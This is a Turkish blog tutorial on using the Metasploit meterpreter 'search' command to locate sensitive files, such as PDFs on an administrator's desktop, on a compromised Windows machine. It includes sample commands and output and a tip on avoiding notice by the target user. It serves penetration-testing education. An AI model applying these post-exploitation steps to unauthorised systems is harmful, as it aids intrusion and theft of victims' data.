---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:40:00Z"
excerpt: Hedef bilgisayarda meterpreter shell açtıktan sonra yapılacak işlemlerden
  birisi de bilgisayar bulunan dosyaları araştırmaktır. Firmalar, kullanıcılarını
  bilgilerinin güvenliğini sağlamaları konusunda eğitirler. Bu eğitim konularından
  birisi de hassas bilgileri paylaşımlı sunucularda değil de yerel bilgisayarlarda
  tutmaktır. İçerik araştırması da genelde bu tarz hassas bilgilerin olduğu dosya
  ve klasörleri keşfetmek için yapılır.
guid: https://www.siberoloji.com/?p=1199
id: 1199
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF İçerik Araştırması
url: /tr/msf-icerik-arastirmasi/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="i̇çerik-araştırması">İçerik Araştırması 
<!-- /wp:heading -->

  Hedef bilgisayarda meterpreter shell açtıktan sonra yapılacak işlemlerden birisi de bilgisayar bulunan dosyaları araştırmaktır. Firmalar, kullanıcılarını bilgilerinin güvenliğini sağlamaları konusunda eğitirler. Bu eğitim konularından birisi de hassas bilgileri paylaşımlı sunucularda değil de yerel bilgisayarlarda tutmaktır. İçerik araştırması da genelde bu tarz hassas bilgilerin olduğu dosya ve klasörleri keşfetmek için yapılır.</p>
 

  Meterpreter oturumunun sunduğu&nbsp;<code>search</code>&nbsp;komutu ile ilgili birkaç örnek inceleyelim.</p>
 

  <code>search -h</code>&nbsp;komutuyla search hakkında yardım bilgilerini görüntüleyebilirsiniz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> search -h
Usage: search <strong>[</strong>-d dir<strong>]</strong> <strong>[</strong>-r recurse] -f pattern
Search <strong>for </strong>files.

OPTIONS:

    -d   The directory/drive to begin searching from. Leave empty to search all drives. <strong>(</strong>Default: <strong>)</strong>
    -f   The file pattern glob to search <strong>for</strong>. <strong>(</strong>e.g. <strong>*</strong>secret<strong>*</strong>.doc?<strong>)</strong>
    -h   Help Banner.
    -r   Recursivly search sub directories. <strong>(</strong>Default: true<strong>)</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="açıklamalar">Açıklamalar</h2>
<!-- /wp:heading -->

  <code>-d</code>: Arama yapılacak klasörü belirtir. Boş bırakılırsa tüm klasörler aranır.</p>
 

  <code>-f</code>: Belli bir dosya paterni belirtmek için kullanılır.</p>
 

  <code>-h</code>: Yardımı görüntüler.</p>
 

  <code>-r</code>: Arama, belirtilen klasör ve tüm alt klasörlerinde gerçekleştirilir. Varsayılan olarak zaten aktif durumdadır.</p>
 

  Aşağıdaki örnek komut, tüm disk bölümlerinde, klasör ve alt klasörlerde&nbsp;<code>.jpg</code>&nbsp;uzantılı dosyaları arayacaktır.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> search -f <strong>*</strong>.jpg
Found 418 results...
...snip...
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg <strong>(</strong>28521 bytes<strong>)</strong>
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Sunset.jpg <strong>(</strong>71189 bytes<strong>)</strong>
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Water lilies.jpg <strong>(</strong>83794 bytes<strong>)</strong>
    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Winter.jpg <strong>(</strong>105542 bytes<strong>)</strong>
...snip...
</code></pre>
<!-- /wp:code -->

  <code>search</code>&nbsp;komutunda varsayılan olarak tüm klasörler aranmaktadır ancak bu işlem çok zaman alır. Ayrıca, hedef bilgisayar kullanıcısı bilgisayarının yavaşladığını fark edebilir. Bu nedenle,&nbsp;<code>-d</code>&nbsp;seçeneğini kullanarak arama yapılacak klasörü belirtmek hem zaman kazandırır hem de sistemin işlem yükünü hafifletir. Aşağıda buna bir örnek kullanımı görebilirsiniz. Komutu girerken klasör ayırıcı işaretini&nbsp;<code>\\</code>&nbsp;şeklinde girdiğimize dikkat edin.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f <strong>*</strong>.pdf
Found 2 results...
    c:\documents and settings\administrator\desktop\operations_plan.pdf <strong>(</strong>244066 bytes<strong>)</strong>
    c:\documents and settings\administrator\desktop\budget.pdf <strong>(</strong>244066 bytes<strong>)</strong>
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->